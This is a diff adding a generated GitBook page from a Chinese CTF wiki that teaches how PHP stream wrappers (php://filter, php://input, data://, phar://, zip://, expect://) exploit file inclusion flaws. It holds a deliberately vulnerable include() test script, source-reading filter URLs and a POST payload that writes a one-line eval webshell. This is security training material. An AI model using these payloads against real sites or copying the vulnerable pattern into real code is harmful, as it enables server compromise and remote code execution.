@@ -1,0 +1,674 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>PHP伪协议 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="repair.html" />
+    
+    
+    <link rel="prev" href="RFI.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="http://sstrunk.com" target="_blank" class="custom-link">Home</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                        <b>1.1.</b>
+                    
+                    CTFS-WiKi 介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                        <b>1.2.</b>
+                    
+                    文件包含漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="LFI.html">
+            
+                <a href="LFI.html">
+            
+                    
+                        <b>1.2.1.</b>
+                    
+                    本地文件包含漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="RFI.html">
+            
+                <a href="RFI.html">
+            
+                    
+                        <b>1.2.2.</b>
+                    
+                    远程文件包含漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.3" data-path="wrappers.html">
+            
+                <a href="wrappers.html">
+            
+                    
+                        <b>1.2.3.</b>
+                    
+                    PHP伪协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="repair.html">
+            
+                <a href="repair.html">
+            
+                    
+                        <b>1.2.4.</b>
+                    
+                    漏洞修复
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../SQLi/">
+            
+                <a href="../SQLi/">
+            
+                    
+                        <b>1.3.</b>
+                    
+                    SQL注入漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../SQLi/example1.html">
+            
+                <a href="../SQLi/example1.html">
+            
+                    
+                        <b>1.3.1.</b>
+                    
+                    数字型注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../SQLI/example1.html">
+            
+                <a href="../SQLI/example1.html">
+            
+                    
+                        <b>1.3.2.</b>
+                    
+                    字符型注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../UP/">
+            
+                <a href="../UP/">
+            
+                    
+                        <b>1.4.</b>
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../UP/example1.html">
+            
+                <a href="../UP/example1.html">
+            
+                    
+                        <b>1.4.1.</b>
+                    
+                    前端JS绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../UP/example1.html">
+            
+                <a href="../UP/example1.html">
+            
+                    
+                        <b>1.4.2.</b>
+                    
+                    文件名绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../UP/example1.html">
+            
+                <a href="../UP/example1.html">
+            
+                    
+                        <b>1.4.3.</b>
+                    
+                    Content-type绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../UP/example1.html">
+            
+                <a href="../UP/example1.html">
+            
+                    
+                        <b>1.4.4.</b>
+                    
+                    文件头绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../parse/">
+            
+                <a href="../parse/">
+            
+                    
+                        <b>1.5.</b>
+                    
+                    解析漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../parse/example1.html">
+            
+                <a href="../parse/example1.html">
+            
+                    
+                        <b>1.5.1.</b>
+                    
+                    IIS 5.x/6.0解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../parse/example1.html">
+            
+                <a href="../parse/example1.html">
+            
+                    
+                        <b>1.5.2.</b>
+                    
+                    IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../parse/example1.html">
+            
+                <a href="../parse/example1.html">
+            
+                    
+                        <b>1.5.3.</b>
+                    
+                    Nginx <8.03 空字节代码执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../parse/example1.html">
+            
+                <a href="../parse/example1.html">
+            
+                    
+                        <b>1.5.4.</b>
+                    
+                    Apache解析漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >PHP伪协议</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p>PHP &#x5E26;&#x6709;&#x5F88;&#x591A;&#x5185;&#x7F6E; URL &#x98CE;&#x683C;&#x7684;&#x5C01;&#x88C5;&#x534F;&#x8BAE;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x7C7B;&#x4F3C; fopen()&#x3001; copy()&#x3001; file_exists() &#x548C; filesize() &#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x3002; &#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5C01;&#x88C5;&#x534F;&#x8BAE;&#xFF0C;&#x8FD8;&#x80FD;&#x901A;&#x8FC7; stream_wrapper_register() &#x6765;&#x6CE8;&#x518C;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5C01;&#x88C5;&#x534F;&#x8BAE;&#x3002;</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<p><img src="013.png" alt="Alt text"></p>
+<h2 id="php------&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6D41;">php://      &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6D41;</h2>
+<p>PHP &#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E9B;&#x6742;&#x9879;&#x8F93;&#x5165;/&#x8F93;&#x51FA;&#xFF08;IO&#xFF09;&#x6D41;&#xFF0C;&#x5141;&#x8BB8;&#x8BBF;&#x95EE; PHP &#x7684;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x6D41;&#x3001;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x548C;&#x9519;&#x8BEF;&#x63CF;&#x8FF0;&#x7B26;&#xFF0C; &#x5185;&#x5B58;&#x4E2D;&#x3001;&#x78C1;&#x76D8;&#x5907;&#x4EFD;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x6D41;&#x4EE5;&#x53CA;&#x53EF;&#x4EE5;&#x64CD;&#x4F5C;&#x5176;&#x4ED6;&#x8BFB;&#x53D6;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x8D44;&#x6E90;&#x7684;&#x8FC7;&#x6EE4;&#x5668;&#x3002;&#x3002;</p>
+<h3 id="phpfilter&#xFF08;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#xFF09;">php://filter&#xFF08;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#xFF09;</h3>
+<p>&#x5143;&#x5C01;&#x88C5;&#x5668;&#xFF0C;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;&quot;&#x6570;&#x636E;&#x6D41;&#x6253;&#x5F00;&quot;&#x65F6;&#x7684;&quot;&#x7B5B;&#x9009;&#x8FC7;&#x6EE4;&quot;&#x5E94;&#x7528;&#xFF0C;&#x5BF9;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x8BFB;&#x5199;</p>
+<p>&#x7528;&#x6CD5;&#xFF1A;?filename=php://filter/convert.base64-encode/resource=xxx.php
+?filename=php://filter/read=convert.base64-encode/resource=xxx.php &#x4E00;&#x6837;</p>
+<p>&#x6761;&#x4EF6;&#xFF1A;&#x53EA;&#x662F;&#x8BFB;&#x53D6;&#xFF0C;&#x9700;&#x8981;&#x5F00;&#x542F; allow_url_fopen&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x5F00;&#x542F; allow_url_include&#xFF1B;</p>
+<p>php://filter &#x76EE;&#x6807;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x7684;&#x53C2;&#x6570;&#x4F5C;&#x4E3A;&#x5B83;&#x8DEF;&#x5F84;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x3002; &#x590D;&#x5408;&#x8FC7;&#x6EE4;&#x94FE;&#x80FD;&#x591F;&#x5728;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;&#x4E0A;&#x6307;&#x5B9A;&#x3002;&#x8BE6;&#x7EC6;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x5177;&#x4F53;&#x8303;&#x4F8B;&#x3002;
+<img src="012.png" alt="Alt text"></p>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="000.png" alt="Alt text"></p>
+<h3 id="phpinput">php://input</h3>
+<p>&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x53EA;&#x8BFB;&#x6D41;&#x3002;&#x5373;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x5230;POST&#x4E0A;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x89E3;&#x6790;&#x7684;&#x539F;&#x59CB;&#x6570;&#x636E;&#x3002;
+enctype=&quot;multipart/form-data&quot; &#x7684;&#x65F6;&#x5019; php://input &#x662F;&#x65E0;&#x6548;&#x7684;&#x3002;</p>
+<p>&#x7528;&#x6CD5;&#xFF1A;?file=php://input &#x6570;&#x636E;&#x5229;&#x7528;POST&#x4F20;&#x8FC7;&#x53BB;</p>
+<h4 id="phpinput-&#xFF08;&#x8BFB;&#x53D6;post&#x6570;&#x636E;&#xFF09;">php://input &#xFF08;&#x8BFB;&#x53D6;POST&#x6570;&#x636E;&#xFF09;</h4>
+<p>&#x78B0;&#x5230;file_get_contents()&#x5C31;&#x8981;&#x60F3;&#x5230;&#x7528;php://input&#x7ED5;&#x8FC7;&#xFF0C;&#x56E0;&#x4E3A;php&#x4F2A;&#x534F;&#x8BAE;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x5229;&#x7528;http&#x534F;&#x8BAE;&#x7684;&#xFF0C;&#x5373;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;POST&#x65B9;&#x5F0F;&#x4F20;&#x6570;&#x636E;&#xFF0C;&#x5177;&#x4F53;&#x51FD;&#x6570;&#x610F;&#x4E49;&#x4E0B;&#x4E00;&#x9879;&#xFF1B;</p>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    echo file_get_contents(&quot;php://input&quot;);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;</p>
+<p> <img src="001.png" alt="Alt text"></p>
+<h4 id="phpinput&#xFF08;&#x5199;&#x5165;&#x6728;&#x9A6C;&#xFF09;">php://input&#xFF08;&#x5199;&#x5165;&#x6728;&#x9A6C;&#xFF09;</h4>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6761;&#x4EF6;&#xFF1A;php&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x9700;&#x540C;&#x65F6;&#x5F00;&#x542F; allow_url_fopen &#x548C; allow_url_include&#xFF08;PHP &lt; 5.3.0&#xFF09;,&#x5C31;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#xFF08;RFI&#xFF09;&#xFF0C;&#x5373;POST&#x8FC7;&#x53BB;PHP&#x4EE3;&#x7801;&#xFF0C;&#x5373;&#x53EF;&#x6267;&#x884C;&#x3002;</p>
+<p>&#x5982;&#x679C;POST&#x7684;&#x6570;&#x636E;&#x662F;&#x6267;&#x884C;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x7684;PHP&#x4EE3;&#x7801;&#xFF0C;&#x5C31;&#x4F1A;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x6728;&#x9A6C;&#x3002;</p>
+<pre><code>&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;
+</code></pre><p><img src="006.png" alt="Alt text"></p>
+<p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="007.png" alt="Alt text"></p>
+<p>&#x5982;&#x679C;&#x4E0D;&#x5F00;&#x542F;allow_url_include&#x4F1A;&#x62A5;&#x9519;
+<img src="005.png" alt="Alt text"></p>
+<h4 id="phpinput&#xFF08;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF09;">php://input&#xFF08;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF09;</h4>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6761;&#x4EF6;&#xFF1A;php&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x9700;&#x540C;&#x65F6;&#x5F00;&#x542F; allow_url_fopen &#x548C; allow_url_include&#xFF08;PHP &lt; 5.30&#xFF09;,&#x5C31;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#xFF08;RFI&#xFF09;&#xFF0C;&#x5373;POST&#x8FC7;&#x53BB;PHP&#x4EE3;&#x7801;&#xFF0C;&#x5373;&#x53EF;&#x6267;&#x884C;&#xFF1B;
+<img src="004.png" alt="Alt text">
+&#x5982;&#x679C;&#x4E0D;&#x5F00;&#x542F;allow_url_include&#x4F1A;&#x62A5;&#x9519;
+<img src="005.png" alt="Alt text"></p>
+<h3 id="file&#x4F2A;&#x534F;&#x8BAE;-&#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF09;">file://&#x4F2A;&#x534F;&#x8BAE; &#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF09;</h3>
+<p>&#x901A;&#x8FC7;file&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x8BFB;&#x53D6;&#x5230;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;</p>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="008.png" alt="Alt text"></p>
+<h3 id="data&#x4F2A;&#x534F;&#x8BAE;">data://&#x4F2A;&#x534F;&#x8BAE;</h3>
+<p>&#x6570;&#x636E;&#x6D41;&#x5C01;&#x88C5;&#x5668;&#xFF0C;&#x548C;php://&#x76F8;&#x4F3C;&#x90FD;&#x662F;&#x5229;&#x7528;&#x4E86;&#x6D41;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5C06;&#x539F;&#x672C;&#x7684;include&#x7684;&#x6587;&#x4EF6;&#x6D41;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E86;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x5236;&#x7684;&#x8F93;&#x5165;&#x6D41;&#x4E2D;&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x5305;&#x542B;&#x65B9;&#x6CD5;&#x5305;&#x542B;&#x4E86;&#x4F60;&#x7684;&#x8F93;&#x5165;&#x6D41;&#xFF0C;&#x901A;&#x8FC7;&#x4F60;&#x8F93;&#x5165;payload&#x6765;&#x5B9E;&#x73B0;&#x76EE;&#x7684;&#xFF1B;
+data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
+<h4 id="data&#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF09;">data://&#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF09;</h4>
+<p>&#x548C;php&#x4F2A;&#x534F;&#x8BAE;&#x7684;input&#x7C7B;&#x4F3C;&#xFF0C;&#x78B0;&#x5230;file_get_contents()&#x6765;&#x7528;&#xFF1B;
+&lt;?php
+// &#x6253;&#x5370; &quot;I love PHP&quot;
+echo file_get_contents(&apos;data://text/plain;base64,SSBsb3ZlIFBIUAo=&apos;);
+?&gt;
+&#x6CE8;&#x610F;&#xFF1A;
+&lt;?php phpinfo();,&#x8FD9;&#x7C7B;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x6700;&#x540E;&#x6CA1;&#x6709;?&gt;&#x95ED;&#x5408;&#xFF1B;</p>
+<h4 id="data&#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF09;">data://&#xFF08;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF09;</h4>
+<p>&#x5982;&#x679C;php.ini&#x91CC;&#x7684;allow_url_include=On&#xFF08;PHP &lt; 5.3.0&#xFF09;,&#x5C31;&#x53EF;&#x4EE5;&#x9020;&#x6210;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x540C;&#x7406;&#x5728;&#x8FD9;&#x5C31;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#xFF08;RFI&#xFF09;
+&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="014.png" alt="Alt text"></p>
+<h3 id="phar&#x4F2A;&#x534F;&#x8BAE;">phar://&#x4F2A;&#x534F;&#x8BAE;</h3>
+<p>&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x5C31;&#x662F;php&#x89E3;&#x538B;&#x7F29;&#x5305;&#x7684;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x4E0D;&#x7BA1;&#x540E;&#x7F00;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x90FD;&#x4F1A;&#x5F53;&#x505A;&#x538B;&#x7F29;&#x5305;&#x6765;&#x89E3;&#x538B;&#x3002;</p>
+<p>&#x7528;&#x6CD5;&#xFF1A;?file=phar://&#x538B;&#x7F29;&#x5305;/&#x5185;&#x90E8;&#x6587;&#x4EF6;
+phar://xxx.png/shell.php
+&#x6CE8;&#x610F;&#xFF1A;
+PHP &gt; =5.3.0
+&#x538B;&#x7F29;&#x5305;&#x9700;&#x8981;&#x662F;zip&#x534F;&#x8BAE;&#x538B;&#x7F29;&#xFF0C;rar&#x4E0D;&#x884C;&#xFF0C;&#x5C06;&#x6728;&#x9A6C;&#x6587;&#x4EF6;&#x538B;&#x7F29;&#x540E;&#xFF0C;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x4EFB;&#x610F;&#x683C;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#x90FD;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002;
+&#x6B65;&#x9AA4;&#xFF1A;
+&#x5199;&#x4E00;&#x4E2A;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x6587;&#x4EF6;shell.php&#xFF0C;&#x7136;&#x540E;&#x7528;zip&#x534F;&#x8BAE;&#x538B;&#x7F29;&#x4E3A;shell.zip&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x540E;&#x7F00;&#x6539;&#x4E3A;png&#x7B49;&#x5176;&#x4ED6;&#x683C;&#x5F0F;&#x3002;
+&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="009.png" alt="Alt text"></p>
+<h3 id="zip&#x4F2A;&#x534F;&#x8BAE;">zip://&#x4F2A;&#x534F;&#x8BAE;</h3>
+<p>zip&#x4F2A;&#x534F;&#x8BAE;&#x548C;phar&#x534F;&#x8BAE;&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x7528;&#x6CD5;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
+<p>&#x7528;&#x6CD5;&#xFF1A;?file=zip://[&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;]#[&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x5185;&#x7684;&#x5B50;&#x6587;&#x4EF6;&#x540D;]
+zip://xxx.png#shell.php</p>
+<p>&#x6761;&#x4EF6;&#xFF1A;
+PHP &gt; =5.3.0&#xFF0C;&#x6CE8;&#x610F;&#x5728;windows&#x4E0B;&#x6D4B;&#x8BD5;&#x8981;5.3.0&lt;PHP&lt;5.4 &#x624D;&#x53EF;&#x4EE5;
+#&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x8981;&#x7F16;&#x7801;&#x4E3A;%23&#xFF0C;&#x5426;&#x5219;&#x6D4F;&#x89C8;&#x5668;&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x4F20;&#x8F93;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</p>
+<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&apos;filename&apos;];
+    include($filename);
+?&gt;
+</code></pre><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;
+<img src="011.png" alt="Alt text"></p>
+<h3 id="php-expect">PHP expect://</h3>
+<p>&#x8FD8;&#x672A;&#x6D4B;&#x8BD5;</p>
+<p>&#x5141;&#x8BB8;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x4E0D;&#x8FC7;&#x5F88;&#x53EF;&#x60DC;&#xFF0C;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x6269;&#x5C55;</p>
+<p><a href="http://pecl.php.net/package/expect" target="_blank">http://pecl.php.net/package/expect</a></p>
+<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x542F;&#x7528;</p>
+<p><a href="http://127.0.0.1/lfi.php?file=expect://ls" target="_blank">http://127.0.0.1/lfi.php?file=expect://ls</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="RFI.html" class="navigation navigation-prev " aria-label="Previous page: 远程文件包含漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="repair.html" class="navigation navigation-next " aria-label="Next page: 漏洞修复">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"PHP伪协议","level":"1.2.3","depth":2,"next":{"title":"漏洞修复","level":"1.2.4","depth":2,"path":"FI/repair.md","ref":"FI/repair.md","articles":[]},"previous":{"title":"远程文件包含漏洞","level":"1.2.2","depth":2,"path":"FI/RFI.md","ref":"FI/RFI.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","expandable-chapters-small","github","-lunr","-search","search-plus","multipart","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"github":{"url":"https://github.com/ctfs-wiki"},"livereload":{},"splitter":{},"multipart":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"expandable-chapters-small":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":true},"search-plus":{}},"level_number":true,"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"collapsible_menu":true,"variables":{"title":"CTFS-WiKi","author":"sstrunk","description":"CTFS-WiKi中集合了WEB类常见的各种漏洞，致力于漏洞准确性、丰富性","theme":"theme-comscore","copyright":"Copyright 